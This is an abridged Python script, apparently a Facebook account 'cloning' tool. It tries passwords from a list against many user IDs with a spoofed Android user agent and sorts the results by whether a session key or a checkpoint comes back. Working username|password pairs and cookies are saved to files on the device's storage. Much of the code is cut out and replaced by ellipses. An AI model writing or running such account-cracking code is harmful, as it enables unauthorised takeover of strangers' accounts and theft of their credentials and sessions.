...
class System:
    ...
    def menu(self):
        ...
        print(f' ({green}2{reset}) WhatsApp Group (Unknown)')
        print(47 * '-')
    ...
    def cloning_process(self):
        os.system('clear')
        print(logo)
        print(f' ({green}•{reset}) Accounts save in /sdcard/Unknown')
        print(47*'-')
    ...
    def cloning(self,uid,first,last):
        ...
        fbbd = 'Vivo'
        user_agent = "Mozilla/5.0 (Linux; Android 11; vivo 1915) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
        for pw in self.passwords:
            try:
                ...
                if "session_key" in response:
                    ...
                    print(f'\r{greenn} [Unknown-OK] {uid} | {pw} {reset}')
                    open('/sdcard/Unknown/unknown-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/Unknown/unknown-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{blue} [unknown-CP] {uid} | {pw} {reset}')
                    open('/sdcard/Unknown/unknown-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
